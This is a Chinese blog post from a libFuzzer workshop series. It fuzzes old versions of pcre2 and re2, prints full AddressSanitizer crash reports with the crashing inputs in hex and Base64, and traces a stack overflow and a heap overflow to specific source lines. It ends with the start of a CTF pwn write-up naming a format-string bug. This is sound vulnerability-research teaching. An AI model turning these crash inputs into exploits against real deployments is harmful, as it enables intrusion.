REDUCE cov: 10 ft: 11 corp: 3/5b lim: 4 exec/s: 0 rss: 28Mb L: 2/2 MS: 3 CopyPart-ChangeByte-EraseBytes-#146 REDUCE cov: 10 ft: 11 corp: 3/4b lim: 4 exec/s: 0 rss: 28Mb L: 1/2 MS: 1 EraseBytes-#1491 REDUCE cov: 16 ft: 17 corp: 4/21b lim: 17 exec/s: 0 rss: 28Mb L: 17/17 MS: 5 ChangeBit-ShuffleBytes-InsertRepeatedBytes-ChangeBit-CrossOver-#1889 REDUCE cov: 16 ft: 17 corp: 4/20b lim: 17 exec/s: 0 rss: 28Mb L: 16/16 MS: 3 ShuffleBytes-CopyPart-EraseBytes-#524288 pulse cov: 16 ft: 17 corp: 4/20b lim: 4096 exec/s: 87381 rss: 830Mb#1048576 pulse cov: 16 ft: 17 corp: 4/20b lim: 4096 exec/s: 104857 rss: 830Mb#2097152 pulse cov: 16 ft: 17 corp: 4/20b lim: 4096 exec/s: 123361 rss: 830Mb#4194304 pulse cov: 16 ft: 17 corp: 4/20b lim: 4096 exec/s: 127100 rss: 830Mb#8388608 pulse cov: 16 ft: 17 corp: 4/20b lim: 4096 exec/s: 131072 rss: 830Mb 另外，在执行configure生成makefile时针对pcre2添加了一些参数：--with-match-limit=1000:限制一次匹配时使用的资源数为1000,默认值为10000000--with-match-limit-recursion=1000:限制一次匹配时的递归深度为1000,默认为10000000(几乎可以说是无限)--enable-never-backslash-C:禁用在字符串中，将反斜线作为转义序列接受。 编译好开源库后就要研究harness了，workshop提供的如下： 12345678910111213141516171819202122232425// Copyright 2016 Google Inc. All Rights Reserved.// Licensed under the Apache License, Version 2.0 (the &quot;License&quot;);#include &lt;stdint.h&gt;#include &lt;stddef.h&gt;#include &lt;string&gt;#include &quot;pcre2posix.h&quot;using std::string;extern &quot;C&quot; int LLVMFuzzerTestOneInput(const unsigned char *data, size_t size) { if (size &lt; 1) return 0; regex_t preg; string str(reinterpret_cast&lt;const char*&gt;(data), size); string pat(str); int flags = data[size/2] - 'a'; // Make it 0 when the byte is 'a'. if (0 == regcomp(&amp;preg, pat.c_str(), flags)) { regmatch_t pmatch[5]; regexec(&amp;preg, str.c_str(), 5, pmatch, 0); regfree(&amp;preg); } return 0;} 解释一下逻辑：首先将样本输入中的’a’置0，之后通过regcomp()函数编译正则表达式，即将指定的正则表达式pat.c_str()编译为特定数据格式preg，使得匹配更加有效。函数regexec()会使用这个数据在目标文本串中进行模式匹配，之后regfree()释放正则表达式。这个harness通过include库”pcre2posix.h”，将pcre2主要的函数包含在了里面，同时这些函数涉及到的一些内存相关的操作也常常是触发crash的点。之后进行编译链接： 1clang++ -O2 -fno-omit-frame-pointer -gline-tables-only -fsanitize=address,fuzzer-no-link -fsanitize-address-use-after-scope pcre2_fuzzer.cc -I pcre2-10.00/src -Wl,--whole-archive pcre2-10.00/.libs/libpcre2-8.a pcre2-10.00/.libs/libpcre2-posix.a -Wl,-no-whole-archive -fsanitize=fuzzer -o pcre2-10.00-fsanitize_fuzzer 和之前不同，这次多了一些参数：--whole-archive和--no-whole-archive是ld专有的命令行参数，clang++并不认识，要通过clang++传递到ld，需要在他们前面加-Wl。--whole-archive可以把 在其后面出现的静态库包含的函数和变量输出到动态库，--no-whole-archive则关掉这个特性，因此这里将两个静态库libpcre2-8.a和libpcre2-posix.a里的符号输出到动态库里，使得程序可以在运行时动态链接使用到的函数，也使得fuzz效率得到了提升。执行一下很快得到了crash: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172#538040 NEW cov: 3286 ft: 15824 corp: 6803/133Kb lim: 74 exec/s: 1775 rss: 775Mb L: 24/74 MS: 3 ChangeASCIIInt-ChangeASCIIInt-EraseBytes-#538092 REDUCE cov: 3286 ft: 15824 corp: 6803/133Kb lim: 74 exec/s: 1775 rss: 775Mb L: 23/74 MS: 2 CopyPart-EraseBytes-#538098 REDUCE cov: 3286 ft: 15824 corp: 6803/133Kb lim: 74 exec/s: 1758 rss: 775Mb L: 6/74 MS: 1 EraseBytes-#538204 REDUCE cov: 3286 ft: 15824 corp: 6803/133Kb lim: 74 exec/s: 1758 rss: 775Mb L: 16/74 MS: 1 EraseBytes-#538415 REDUCE cov: 3286 ft: 15825 corp: 6804/134Kb lim: 74 exec/s: 1759 rss: 775Mb L: 35/74 MS: 1 ShuffleBytes-===================================================================17319==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x7ffe809de45f at pc 0x0000005e1518 bp 0x7ffe809dd8f0 sp 0x7ffe809dd8e8READ of size 1 at 0x7ffe809de45f thread T0 #0 0x5e1517 in match /home/admin/libfuzzer-workshop/lessons/11/pcre2-10.00/src/pcre2_match.c:5968:11 #1 0x5a0624 in pcre2_match_8 /home/admin/libfuzzer-workshop/lessons/11/pcre2-10.00/src/pcre2_match.c:6876:8 #2 0x5f5e64 in regexec /home/admin/libfuzzer-workshop/lessons/11/pcre2-10.00/src/pcre2posix.c:291:6 #3 0x551947 in LLVMFuzzerTestOneInput /home/admin/libfuzzer-workshop/lessons/11/pcre2_fuzzer.cc:21:5 #4 0x459661 in fuzzer::Fuzzer::ExecuteCallback(unsigned char const*, unsigned long) /local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:553:15 #5 0x458ea5 in fuzzer::Fuzzer::RunOne(unsigned char const*, unsigned long, bool, fuzzer::InputInfo*, bool*) /local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:469:3 #6 0x45b147 in fuzzer::Fuzzer::MutateAndTestOne() /local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:695:19 #7 0x45be65 in fuzzer::Fuzzer::Loop(std::Fuzzer::vector&lt;fuzzer::SizedFile, fuzzer::fuzzer_allocator&lt;fuzzer::SizedFile&gt; &gt;&amp;) /local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:831:5 #8 0x449c28 in fuzzer::FuzzerDriver(int*, char***, int (*)(unsigned char const*, unsigned long)) /local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/fuzzer/FuzzerDriver.cpp:825:6 #9 0x473092 in main /local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/fuzzer/FuzzerMain.cpp:19:10 #10 0x7f0d3f5c3bf6 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x21bf6) #11 0x41ddb9 in _start (/home/admin/libfuzzer-workshop/lessons/11/pcre2-10.00-fsanitize_fuzzer+0x41ddb9)Address 0x7ffe809de45f is located in stack of thread T0 at offset 159 in frame #0 0x55136f in LLVMFuzzerTestOneInput /home/admin/libfuzzer-workshop/lessons/11/pcre2_fuzzer.cc:13 This frame has 6 object(s): [32, 40) '__dnew.i.i.i.i26' [64, 72) '__dnew.i.i.i.i' [96, 128) 'preg' (line 15) [160, 192) 'str' (line 16) &lt;== Memory access at offset 159 underflows this variable [224, 256) 'pat' (line 17) [288, 328) 'pmatch' (line 20)HINT: this may be a false positive if your program uses some custom stack unwind mechanism, swapcontext or vfork (longjmp and C++ exceptions *are* supported)SUMMARY: AddressSanitizer: stack-buffer-overflow /home/admin/libfuzzer-workshop/lessons/11/pcre2-10.00/src/pcre2_match.c:5968:11 in matchShadow bytes around the buggy address: 0x100050133c30: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x100050133c40: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x100050133c50: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x100050133c60: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x100050133c70: 00 00 00 00 00 00 00 00 f1 f1 f1 f1 f8 f2 f2 f2=&gt;0x100050133c80: f8 f2 f2 f2 00 00 00 00 f2 f2 f2[f2]00 00 00 00 0x100050133c90: f2 f2 f2 f2 00 00 00 00 f2 f2 f2 f2 00 00 00 00 0x100050133ca0: 00 f3 f3 f3 f3 f3 f3 f3 00 00 00 00 00 00 00 00 0x100050133cb0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x100050133cc0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x100050133cd0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00Shadow byte legend (one shadow byte represents 8 application bytes): Addressable: 00 Partially addressable: 01 02 03 04 05 06 07 Heap left redzone: fa Freed heap region: fd Stack left redzone: f1 Stack mid redzone: f2 Stack right redzone: f3 Stack after return: f5 Stack use after scope: f8 Global redzone: f9 Global init order: f6 Poisoned by user: f7 Container overflow: fc Array cookie: ac Intra object redzone: bb ASan internal: fe Left alloca redzone: ca Right alloca redzone: cb Shadow gap: cc==17319==ABORTINGMS: 1 ChangeBit-; base unit: 7a9e5264e8896a1d996088a56a315765c53c7b330x5c,0x43,0x2b,0x5c,0x53,0x2b,0xde,0xac,0xd4,0xa3,0x53,0x2b,0x21,0x21,0x68,\\\\C+\\\\S+\\xde\\xac\\xd4\\xa3S+!!hartifact_prefix='./'; Test unit written to ./crash-5ae911f7e958e646e05ebe28421183f6efc0bc88Base64: XEMrXFMr3qzUo1MrISFo SUMMARY: AddressSanitizer: stack-buffer-overflow /home/admin/libfuzzer-workshop/lessons/11/pcre2-10.00/src/pcre2_match.c:5968:11 in match指出在pcre2_match.c里存在stackoverflow。对漏洞进行定位：在pcre2posix.c中调用了pcre2_match 12#in pcre2posix.crc = pcre2_match((const pcre2_code *)preg-&gt;re_pcre2_code,(PCRE2_SPTR)string + so, (eo - so), 0, options, md, NULL); pcre2_match定义在pcre2_match.c中，在pcre2_match中调用了match函数： 12#in pcre2_match.crc = match(start_match, mb-&gt;start_code, start_match, 2, mb, NULL, 0); 在执行match的过程中出现栈溢出的位置在于： 12345678910for(;;) { if (eptr == pp) goto TAIL_RECURSE; RMATCH(eptr, ecode, offset_top, mb, eptrb, RM46); if (rrc != MATCH_NOMATCH) RRETURN(rrc); eptr--; BACKCHAR(eptr); //overflow处 if (ctype == OP_ANYNL &amp;&amp; eptr &gt; pp &amp;&amp; UCHAR21(eptr) == CHAR_NL &amp;&amp; UCHAR21(eptr - 1) == CHAR_CR) eptr--; } 当我以为fuzz的工作已经完成的时候，只是尝试着修改了一下编译链接harness时的静态库为全部库： 1clang++ -O2 -fno-omit-frame-pointer -gline-tables-only -fsanitize=address,fuzzer-no-link -fsanitize-address-use-after-scope pcre2_fuzzer.cc -I pcre2-10.00/src -Wl,--whole-archive pcre2-10.00/.libs/*.a -Wl,-no-whole-archive -fsanitize=fuzzer -o pcre2-10.00-fsanitize_fuzzer 再次fuzz的结果令我惊讶： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384#605510 REDUCE cov: 3273 ft: 15706 corp: 6963/139Kb lim: 86 exec/s: 255 rss: 597Mb L: 18/86 MS: 1 EraseBytes-#605733 NEW cov: 3273 ft: 15707 corp: 6964/139Kb lim: 86 exec/s: 255 rss: 597Mb L: 29/86 MS: 3 ShuffleBytes-CopyPart-CMP- DE: &quot;+n&quot;-#605994 REDUCE cov: 3273 ft: 15707 corp: 6964/139Kb lim: 86 exec/s: 255 rss: 597Mb L: 36/86 MS: 1 EraseBytes-#606040 REDUCE cov: 3273 ft: 15707 corp: 6964/139Kb lim: 86 exec/s: 255 rss: 597Mb L: 19/86 MS: 1 EraseBytes-#606121 NEW cov: 3273 ft: 15708 corp: 6965/139Kb lim: 86 exec/s: 255 rss: 597Mb L: 27/86 MS: 1 CopyPart-#606196 NEW cov: 3273 ft: 15709 corp: 6966/139Kb lim: 86 exec/s: 255 rss: 597Mb L: 86/86 MS: 5 ChangeASCIIInt-ChangeBit-ChangeBit-ChangeASCIIInt-CrossOver-===================================================================10857==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x6110001625ea at pc 0x00000055d548 bp 0x7ffccf4098f0 sp 0x7ffccf4098e8WRITE of size 1 at 0x6110001625ea thread T0 #0 0x55d547 in _pcre2_ord2utf_8 /home/admin/libfuzzer-workshop/lessons/11/pcre2-10.00/src/pcre2_ord2utf.c:92:12 #1 0x4f60f4 in add_to_class /home/admin/libfuzzer-workshop/lessons/11/pcre2-10.00/src/pcre2_compile.c:2870:20 #2 0x4f5dd0 in add_to_class /home/admin/libfuzzer-workshop/lessons/11/pcre2-10.00/src/pcre2_compile.c:2820:18 #3 0x4e03e0 in compile_branch /home/admin/libfuzzer-workshop/lessons/11/pcre2-10.00/src/pcre2_compile.c:3923:11 #4 0x4d3f2f in compile_regex /home/admin/libfuzzer-workshop/lessons/11/pcre2-10.00/src/pcre2_compile.c:6723:8 #5 0x4d136c in pcre2_compile_8 /home/admin/libfuzzer-workshop/lessons/11/pcre2-10.00/src/pcre2_compile.c:7734:7 #6 0x56c3b3 in regcomp /home/admin/libfuzzer-workshop/lessons/11/pcre2-10.00/src/pcre2posix.c:219:23 #7 0x4c83c9 in LLVMFuzzerTestOneInput /home/admin/libfuzzer-workshop/lessons/11/pcre2_fuzzer.cc:19:12 #8 0x585632 in fuzzer::Fuzzer::ExecuteCallback(unsigned char const*, unsigned long) /home/admin/libfuzzer-workshop/libFuzzer/Fuzzer/./FuzzerLoop.cpp:556:15 #9 0x584cd5 in fuzzer::Fuzzer::RunOne(unsigned char const*, unsigned long, bool, fuzzer::InputInfo*, bool*) /home/admin/libfuzzer-workshop/libFuzzer/Fuzzer/./FuzzerLoop.cpp:470:3 #10 0x58606c in fuzzer::Fuzzer::MutateAndTestOne() /home/admin/libfuzzer-workshop/libFuzzer/Fuzzer/./FuzzerLoop.cpp:698:19 #11 0x586c75 in fuzzer::Fuzzer::Loop(std::vector&lt;fuzzer::SizedFile, fuzzer::fuzzer_allocator&lt;fuzzer::SizedFile&gt; &gt;&amp;) /home/admin/libfuzzer-workshop/libFuzzer/Fuzzer/./FuzzerLoop.cpp:830:5 #12 0x572b8b in fuzzer::FuzzerDriver(int*, char***, int (*)(unsigned char const*, unsigned long)) /home/admin/libfuzzer-workshop/libFuzzer/Fuzzer/./FuzzerDriver.cpp:824:6 #13 0x56cc20 in main /home/admin/libfuzzer-workshop/libFuzzer/Fuzzer/./FuzzerMain.cpp:19:10 #14 0x7f16a7ecbbf6 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x21bf6) #15 0x41deb9 in _start (/home/admin/libfuzzer-workshop/lessons/11/pcre2_10.00_fuzzer+0x41deb9)0x6110001625ea is located 0 bytes to the right of 234-byte region [0x611000162500,0x6110001625ea)allocated by thread T0 here: #0 0x495dbd in malloc /local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:145:3 #1 0x4d0953 in pcre2_compile_8 /home/admin/libfuzzer-workshop/lessons/11/pcre2-10.00/src/pcre2_compile.c:7656:3 #2 0x56c3b3 in regcomp /home/admin/libfuzzer-workshop/lessons/11/pcre2-10.00/src/pcre2posix.c:219:23 #3 0x4c83c9 in LLVMFuzzerTestOneInput /home/admin/libfuzzer-workshop/lessons/11/pcre2_fuzzer.cc:19:12 #4 0x585632 in fuzzer::Fuzzer::ExecuteCallback(unsigned char const*, unsigned long) /home/admin/libfuzzer-workshop/libFuzzer/Fuzzer/./FuzzerLoop.cpp:556:15 #5 0x584cd5 in fuzzer::Fuzzer::RunOne(unsigned char const*, unsigned long, bool, fuzzer::InputInfo*, bool*) /home/admin/libfuzzer-workshop/libFuzzer/Fuzzer/./FuzzerLoop.cpp:470:3 #6 0x58606c in fuzzer::Fuzzer::MutateAndTestOne() /home/admin/libfuzzer-workshop/libFuzzer/Fuzzer/./FuzzerLoop.cpp:698:19 #7 0x586c75 in fuzzer::Fuzzer::Loop(std::vector&lt;fuzzer::SizedFile, fuzzer::fuzzer_allocator&lt;fuzzer::SizedFile&gt; &gt;&amp;) /home/admin/libfuzzer-workshop/libFuzzer/Fuzzer/./FuzzerLoop.cpp:830:5 #8 0x572b8b in fuzzer::FuzzerDriver(int*, char***, int (*)(unsigned char const*, unsigned long)) /home/admin/libfuzzer-workshop/libFuzzer/Fuzzer/./FuzzerDriver.cpp:824:6 #9 0x56cc20 in main /home/admin/libfuzzer-workshop/libFuzzer/Fuzzer/./FuzzerMain.cpp:19:10 #10 0x7f16a7ecbbf6 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x21bf6)SUMMARY: AddressSanitizer: heap-buffer-overflow /home/admin/libfuzzer-workshop/lessons/11/pcre2-10.00/src/pcre2_ord2utf.c:92:12 in _pcre2_ord2utf_8Shadow bytes around the buggy address: 0x0c2280024460: fd fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa 0x0c2280024470: fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd 0x0c2280024480: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c2280024490: fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa 0x0c22800244a0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00=&gt;0x0c22800244b0: 00 00 00 00 00 00 00 00 00 00 00 00 00[02]fa fa 0x0c22800244c0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c22800244d0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c22800244e0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c22800244f0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c2280024500: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa faShadow byte legend (one shadow byte represents 8 application bytes): Addressable: 00 Partially addressable: 01 02 03 04 05 06 07 Heap left redzone: fa Freed heap region: fd Stack left redzone: f1 Stack mid redzone: f2 Stack right redzone: f3 Stack after return: f5 Stack use after scope: f8 Global redzone: f9 Global init order: f6 Poisoned by user: f7 Container overflow: fc Array cookie: ac Intra object redzone: bb ASan internal: fe Left alloca redzone: ca Right alloca redzone: cb Shadow gap: cc==10857==ABORTINGMS: 5 InsertRepeatedBytes-CMP-CrossOver-ChangeBit-CrossOver- DE: &quot;+\\xc6&quot;-; base unit: ce48e02587af5cb5d3e84053d6d5b4545bbb6e320x5b,0x2a,0x5d,0x3f,0x5b,0x3f,0x3f,0x5c,0x53,0x3f,0x5b,0x2a,0x5d,0x3f,0x5b,0x3f,0x3f,0x5c,0x53,0x2a,0x63,0x20,0x20,0x20,0x25,0xc6,0xa4,0x1a,0x2d,0x5b,0x43,0x1a,0x2d,0xc6,0xa4,0x5d,0x50,0x2a,0x5d,0x50,0x2a,0x5e,0x58,0x42,0x5c,0x5c,0x3f,0x77,0xc,0x5c,0x77,0x0,0x36,0x5c,0x20,0xa0,0xc0,0xec,0x2d,0x3f,0x5c,0x77,0x3f,0x5c,0x2d,0xac,0x3f,0x5c,[*]?[??\\\\S?[*]?[??\\\\S*c %\\xc6\\xa4\\x1a-[C\\x1a-\\xc6\\xa4]P*]P*^XB\\\\\\\\?w\\x0c\\\\w\\x006\\\\ \\xa0\\xc0\\xec-?\\\\w?\\\\-\\xac?\\\\artifact_prefix='./'; Test unit written to ./crash-849705875bb2098817f3299ee582e2207a568e63Base64: WypdP1s/P1xTP1sqXT9bPz9cUypjICAgJcakGi1bQxotxqRdUCpdUCpeWEJcXD93DFx3ADZcIKDA7C0/XHc/XC2sP1w=stat::number_of_executed_units: 606206stat::average_exec_per_sec: 255stat::new_units_added: 8960stat::slowest_unit_time_sec: 0stat::peak_rss_mb: 598 得到了一个不一样的crash。但这也在情理之中，通过链接不同或更多的静态库。只要harness程序逻辑所能涉及到，就有机会得到不同静态库里的crash。通过SUMMARY: AddressSanitizer: heap-buffer-overflow /home/admin/libfuzzer-workshop/lessons/11/pcre2-10.00/src/pcre2_ord2utf.c:92:12 in _pcre2_ord2utf_8我们了解到在pcre2_ord2utf.c中存在heapoverflow的漏洞。同样对漏洞进行定位：这次的函数调用有点多，一层一层的找：首先在pcre2posix.c中调用pcre2_compile： 12preg-&gt;re_pcre2_code = pcre2_compile((PCRE2_SPTR)pattern, -1, options, &amp;errorcode, &amp;erroffset, NULL); 该函数定义在pcre2_compile.c中，然后又调用了compile_regex: 12(void)compile_regex(re-&gt;overall_options, &amp;code, &amp;ptr, &amp;errorcode, FALSE, FALSE, 0, 0, &amp;firstcu, &amp;firstcuflags, &amp;reqcu, &amp;reqcuflags, NULL, &amp;cb, NULL); 之后在函数compile_regex中又调用了compile_branch： 1234567if (!compile_branch(&amp;options, &amp;code, &amp;ptr, errorcodeptr, &amp;branchfirstcu, &amp;branchfirstcuflags, &amp;branchreqcu, &amp;branchreqcuflags, &amp;bc, cond_depth, cb, (lengthptr == NULL)? NULL : &amp;length)) { *ptrptr = ptr; return FALSE; } compile_branch中又调用了add_to_class： 12class_has_8bitchar += add_to_class(classbits, &amp;class_uchardata, options, cb, c, d); 接着add_to_class调用PRIV: 123456else if (start == end) { *uchardata++ = XCL_SINGLE; uchardata += PRIV(ord2utf)(start, uchardata); } } PRIV定义在pcre2_ord2utf.c中： 1234567891011121314151617181920212223242526272829303132333435363738unsigned intPRIV(ord2utf)(uint32_t cvalue, PCRE2_UCHAR *buffer){/* Convert to UTF-8 */#if PCRE2_CODE_UNIT_WIDTH == 8register int i, j;for (i = 0; i &lt; PRIV(utf8_table1_size); i++) if ((int)cvalue &lt;= PRIV(utf8_table1)[i]) break;buffer += i;for (j = i; j &gt; 0; j--) { *buffer-- = 0x80 | (cvalue &amp; 0x3f); //此处对于内存指针循环操作由于限制条件不当导致出现了heap_overflow cvalue &gt;&gt;= 6; }*buffer = PRIV(utf8_table2)[i] | cvalue;return i + 1;/* Convert to UTF-16 */#elif PCRE2_CODE_UNIT_WIDTH == 16if (cvalue &lt;= 0xffff) { *buffer = (PCRE2_UCHAR)cvalue; return 1; }cvalue -= 0x10000;*buffer++ = 0xd800 | (cvalue &gt;&gt; 10);*buffer = 0xdc00 | (cvalue &amp; 0x3ff);return 2;/* Convert to UTF-32 */#else*buffer = (PCRE2_UCHAR)cvalue;return 1;#endif} 总结下这两个crash：第一个crash由harness中的regexech函数的匹配逻辑触发stack_overflow，位于pcre2_match.c:5968:11；第二个crash由regcomp函数的编译逻辑触发heap_overflow，位于pcre2_ord2utf.c:92:12。一层层的函数调用关系分析得让人头大，但这也正体现了漏洞挖掘中的“挖掘”二字的含义。 fuzzing re2这一个例子将让我们意识到max_len的选择对于fuzz效率的影响。re2是一个高效的、原则性的正则表达式库。是由两位来在Google的大神用C++实现的。Go中的regexp正则表达式包也是由re2实现的。workshop提供的是re2-2014-12-09的版本。先源码编译： 12345tar xzf re2.tgzcd re2export FUZZ_CXXFLAGS=&quot;-O2 -fno-omit-frame-pointer -gline-tables-only -fsanitize=address,fuzzer-no-link -fsanitize-address-use-after-scope&quot;make cleanCXX=clang++ CXXFLAGS=&quot;$FUZZ_CXXFLAGS&quot; make -j 接着研究harness： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687// Copyright (c) 2016 The Chromium Authors. All rights reserved.// Use of this source code is governed by a BSD-style license that can be// found in the LICENSE file.#include &lt;stddef.h&gt;#include &lt;stdint.h&gt;#include &lt;string&gt;#include &quot;re2/re2.h&quot;#include &quot;util/logging.h&quot;using std::string;void Test(const string&amp; buffer, const string&amp; pattern, const RE2::Options&amp; options) { RE2 re(pattern, options); if (!re.ok()) return; string m1, m2; int i1, i2; double d1; if (re.NumberOfCapturingGroups() == 0) { RE2::FullMatch(buffer, re); RE2::PartialMatch(buffer, re); } else if (re.NumberOfCapturingGroups() == 1) { RE2::FullMatch(buffer, re, &amp;m1); RE2::PartialMatch(buffer, re, &amp;i1); } else if (re.NumberOfCapturingGroups() == 2) { RE2::FullMatch(buffer, re, &amp;i1, &amp;i2); RE2::PartialMatch(buffer, re, &amp;m1, &amp;m2); } re2::StringPiece input(buffer); RE2::Consume(&amp;input, re, &amp;m1); RE2::FindAndConsume(&amp;input, re, &amp;d1); string tmp1(buffer); RE2::Replace(&amp;tmp1, re, &quot;zz&quot;); string tmp2(buffer); RE2::GlobalReplace(&amp;tmp2, re, &quot;xx&quot;); RE2::QuoteMeta(re2::StringPiece(pattern));}// Entry point for LibFuzzer.extern &quot;C&quot; int LLVMFuzzerTestOneInput(const uint8_t* data, size_t size) { if (size &lt; 1) return 0; RE2::Options options; size_t options_randomizer = 0; for (size_t i = 0; i &lt; size; i++) options_randomizer += data[i]; if (options_randomizer &amp; 1) options.set_encoding(RE2::Options::EncodingLatin1); options.set_posix_syntax(options_randomizer &amp; 2); options.set_longest_match(options_randomizer &amp; 4); options.set_literal(options_randomizer &amp; 8); options.set_never_nl(options_randomizer &amp; 16); options.set_dot_nl(options_randomizer &amp; 32); options.set_never_capture(options_randomizer &amp; 64); options.set_case_sensitive(options_randomizer &amp; 128); options.set_perl_classes(options_randomizer &amp; 256); options.set_word_boundary(options_randomizer &amp; 512); options.set_one_line(options_randomizer &amp; 1024); options.set_log_errors(false); const char* data_input = reinterpret_cast&lt;const char*&gt;(data); { string pattern(data_input, size); string buffer(data_input, size); Test(buffer, pattern, options); } if (size &gt;= 3) { string pattern(data_input, size / 3); string buffer(data_input + size / 3, size - size / 3); Test(buffer, pattern, options); } return 0;} 可以看到harness用到了很多re2里的方法，最后使用FullMatch和PartialMatch接口进行匹配buffer和re。其中buffer是由data_input和size初始化得到（data_input由输入的data经无关类型转换得到），re是由pattern和options建立的RE2对象。注意到harness里有几个条件分支语句，首先是size&lt;1是直接返回，还有就是当size&gt;=3时，初始化pattn和buffer用的是size/3和size-size/3说明它对我们的输入的size进行了切割，初始化pattern用到的是data_input + size / 3，而初始化buffer是用的之后的data_input。这样使得我们样例的size会对fuzz的过程产生影响。如果size很短，可能无法触发crash，而如果size很大，对harness的执行匹配过程就会更加耗时，影响fuzz寻找覆盖点的效率。下面做几个测试，比较一下max_len对fuzz过程的影响：编译链接harness： 1clang++ -O2 -fno-omit-frame-pointer -gline-tables-only -fsanitize=address,fuzzer-no-link -fsanitize-address-use-after-scope -std=gnu++98 target.cc -I re2/ re2/obj/libre2.a -fsanitize=fuzzer -o re2_fuzzer 由于使用的re2版本较老了，编译的时候使用了c++98标准。 首先我们设置max_len为10，执行时间为100秒,-print_final_stats=1打印最后的结果，corpus1作为语料库的存放处： 12345678➜ 10 git:(master) ✗ ./re2_fuzzer ./corpus1 -print_final_stats=1 -max_len=10 -max_total_time=100Done 643760 runs in 101 second(s)stat::number_of_executed_units: 643760stat::average_exec_per_sec: 6373stat::new_units_added: 36stat::slowest_unit_time_sec: 0stat::peak_rss_mb: 456 只探测到了36个代码单元。接着设置max_len为100，执行时间为100秒,-print_final_stats=1打印最后的结果，corpus2作为语料库的存放处： 12345678./re2_fuzzer ./corpus2 -print_final_stats=1 -max_len=100 -max_total_time=100Done 233437 runs in 101 second(s)stat::number_of_executed_units: 233437stat::average_exec_per_sec: 2311stat::new_units_added: 50stat::slowest_unit_time_sec: 0stat::peak_rss_mb: 675 探测到了50个代码单元,感觉差别不大。然年设置max_len为1000，执行时间为100秒,-print_final_stats=1打印最后的结果，corpus3作为语料库的存放处： 12345678./re2_fuzzer ./corpus3 -print_final_stats=1 -max_len=1000 -max_total_time=100Done 105935 runs in 101 second(s)stat::number_of_executed_units: 105935stat::average_exec_per_sec: 1048stat::new_units_added: 97stat::slowest_unit_time_sec: 0stat::peak_rss_mb: 830 这次探测到了97个代码单元，是第二个的2倍，第一个的3倍左右。最后再设置max_len为500，执行时间为100秒,-print_final_stats=1打印最后的结果，corpus4作为语料库的存放处 12345678./re2_fuzzer ./corpus4 -print_final_stats=1 -max_len=500 -max_total_time=100Done 119361 runs in 101 second(s)stat::number_of_executed_units: 119361stat::average_exec_per_sec: 1181stat::new_units_added: 117stat::slowest_unit_time_sec: 0stat::peak_rss_mb: 827 结果也比较明显，不同的max_len对fuzz的效率有着不同的影响，当然这也和你写的harness有关。因此在执行fuzzer的时候选择合适的max_len(如本例中的max_len在100~1000比较合适)会使得我们fuzzer探测到更多的代码块，得到crash的效率也就越大。 总结libfuzzer workshop到此就全部学习完了。libfuzzer作为最常用的fuzz工具，它所涉及到的一些使用方法在workshop里都有相应的lesson。就我个人而言，在逐步学习libfuzzer的过程中感觉到libfuzzer对于开源库提供的接口函数的fuzz是十分强力的，而这也是我们在学习libfuzzer中的难点:如何能够设计出合理的harness，这需要我们对要fuzz的开源库提供的方法有一定的了解，经过攻击面分析等去逐步改善我们的harness，使得我们与获得crash更近一步。 初学libfuzzer，有错误疏忽之处烦请各位师傅指正。","link":"/2021/01/06/libfuzzer3/"},{"title":"国赛_final","text":"国赛_final in武汉 第二次打线下了，出现了很多问题。现在的大比赛基本不怎么出heap相关的套路题目了（除了针对新版libc的一些利用方式和复杂的堆风水之外），比较常出的题型有vmpwn，异构架下（mips,arm）的pwn，C++程序以及一些底层机制的漏洞。同时逆向也随之增大。要加强自己的逆向功底了。 day1第一天是awd，平台崩了，被迫停赛。我也不多bb平台了，着眼于题目吧（质量还是挺高的）。按题目的难易程度来吧： pwn3一道线程pwn题。 123456while ( 1 ) { if ( pthread_create(&amp;newthread, 0LL, (void *(*)(void *))start_routine, 0LL) == -1 ) puts(&quot;create thread failed&quot;); pthread_join(newthread, 0LL); } 漏洞在于start_routine里的__printf_chk存在fmt以及栈溢出。 